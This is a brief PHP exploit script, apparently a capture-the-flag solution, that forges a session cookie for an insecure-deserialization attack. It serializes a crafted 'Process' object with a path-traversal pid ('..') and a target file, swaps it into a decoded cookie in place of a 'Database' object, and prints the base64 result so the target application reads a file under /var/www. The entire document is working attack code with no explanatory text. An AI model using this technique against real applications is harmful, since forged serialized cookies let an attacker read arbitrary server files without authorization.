<?php

class Process
{
    protected $pid = "..";
    protected $lock = true;
    protected $cmdname = "var/www/omer.txt";

    function close(){
        if(!$this->lock)
            // Havent implemented yet
            return 0;
        else
            $this->readProcFile();

    }

    function readProcFile(){
        echo file_get_contents("/proc/".$this->pid."/".$this->cmdname);
    }
}


$deneme = new Process;
$process = serialize($deneme);


$cookie = base64_decode("Tzo3OiJTZXNzaW9uIjozOntzOjc6IgAqAG5hbWUiO3M6NDoidGVzdCI7czoxMToiACoAbGFzdG5hbWUiO2k6MTIzO3M6OToiACoAaGFuZGxlIjtPOjg6IkRhdGFiYXNlIjowOnt9fQ");

$cookie = str_replace('O:8:"Database":0:{}', $process, $cookie);

//echo $cookie;

echo(base64_encode($cookie));




?>